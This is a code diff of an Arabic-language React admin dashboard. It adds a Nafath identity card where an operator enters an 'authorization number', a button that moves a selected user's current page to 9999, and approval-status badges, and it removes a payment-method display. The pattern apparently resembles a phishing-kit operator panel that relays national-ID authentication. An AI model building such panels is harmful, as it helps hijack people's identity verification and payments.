-                                  variant="ghost"
-                                  size="sm"
-                                  onClick={() => setEditingAuthNumber(false)}
-                                  className="h-9 px-3 text-xs hover:bg-accent"
-                                >
-                                  إلغاء
-                                </Button>
-                              </div>
-                            )}
-                          </div>
-                        </div>
-                      )}
+                <div className="bg-card rounded-2xl p-6 shadow-xl border border-border/50 hover:shadow-2xl transition-all xl:col-span-3">
+                  <div className="flex items-center gap-3 mb-5 pb-4 border-b border-border/50">
+                    <div className="p-3 bg-primary/10 rounded-xl">
+                      <CheckCheck className="h-6 w-6 text-primary" />
                     </div>
+                    <h3 className="text-xl font-bold text-foreground">معلومات نفاذ</h3>
+                  </div>
+                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                    {selectedUser.nafadId && <DataRow label="رقم نفاذ" value={selectedUser.nafadId} icon={Shield} />}
+                    <div className="bg-input/30 rounded-xl p-4 border border-border/30">
+                      <p className="text-sm font-bold text-muted-foreground mb-3">رقم التفويض</p>
+                      <div className="flex gap-2">
+                        <Input
+                          value={authNumberValue || selectedUser.authNumber || ""}
+                          onChange={(e) => setAuthNumberValue(e.target.value)}
+                          className="flex-1 h-10 rounded-lg font-mono"
+                          placeholder="أدخل رقم التفويض"
+                        />
+                        <Button
+                          size="sm"
+                          onClick={() => {
+                            updateAuthNumber(selectedUser.id, authNumberValue || selectedUser.authNumber || "")
+                            setAuthNumberValue("")
+                          }}
+                          className="rounded-lg px-4"
+                        >
+                          حفظ
+                        </Button>
+                      </div>
+                    </div>
+                  </div>
+                  <div className="flex items-center justify-between p-4 bg-card-hover rounded-lg border border-border/50">
+                    <div className="flex items-center gap-3">
+                      <Hash className="h-5 w-5 text-muted-foreground" />
+                      <div>
+                        <p className="text-sm text-muted-foreground">الصفحة الحالية</p>
+                        <p className="text-base font-semibold text-foreground font-mono">
+                          {selectedUser.currentPage || "غير محدد"}
+                        </p>
+                      </div>
+                    </div>
+                    <Button
+                      onClick={() => updateCurrentPage(selectedUser.id)}
+                      className="bg-primary hover:bg-primary/90 text-primary-foreground shadow-md hover:shadow-lg transition-all"
+                      size="sm"
+                    >
+                      تحديث إلى 9999
+                    </Button>
                   </div>
                 </div>
               )}
-
-              {/* Payment Method Message */}
-              <div className="flex justify-end animate-in fade-in slide-in-from-left-4 duration-300">
-                <div className="bg-message-sent rounded-2xl p-6 max-w-md shadow-xl">
-                  <h3 className="font-bold mb-4 text-message-sent-foreground text-lg flex items-center gap-2">
-                    <span className="h-1 w-1 bg-message-sent-foreground rounded-full"></span>
-                    طريقة الدفع
-                  </h3>
-                  <div className="space-y-3 text-sm">
-                    <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
-                      <span className="text-message-sent-muted font-medium">الطريقة:</span>
-                      <span className="text-message-sent-foreground font-bold capitalize">
-                        {selectedUser.paymentMethod?.replace("_", " ")}
-                      </span>
-                    </div>
-                  </div>
-                </div>
-              </div>
             </div>
           </div>
         </div>
       )}
+    </div>
+  )
+}
+
+const DataRow = ({ label, value, icon: Icon }: { label: string; value?: string | number; icon?: any }) => {
+  return (
+    <div className="bg-input/30 rounded-xl p-4 border border-border/30 hover:bg-input/50 transition-all">
+      <p className="text-sm font-bold text-muted-foreground mb-2">{label}</p>
+      <p className="text-base text-foreground font-semibold" dir="ltr">{value || "غير متوفر"}</p>
+      {Icon && <Icon className="h-6 w-6 text-primary ml-2" />}
+    </div>
+  )
+}
+
+function ApprovalStatus({ status, label }: { status: string; label: string }) {
+  const statusConfig = {
+    approved: { color: "bg-emerald-500/10 text-emerald-400 border-emerald-500/30", text: "تمت الموافقة" },
+    rejected: { color: "bg-red-500/10 text-red-400 border-red-500/30", text: "مرفوض" },
+    pending: { color: "bg-amber-500/10 text-amber-400 border-amber-500/30", text: "قيد الانتظار" },
+  }
+
+  const config = statusConfig[status as keyof typeof statusConfig] || statusConfig.pending
+
+  return (
+    <div className={`rounded-xl p-4 border-2 ${config.color}`}>
+      <p className="text-sm font-bold">{label}</p>
+      <p className="text-base font-bold mt-1">{config.text}</p>
     </div>
   )
 }
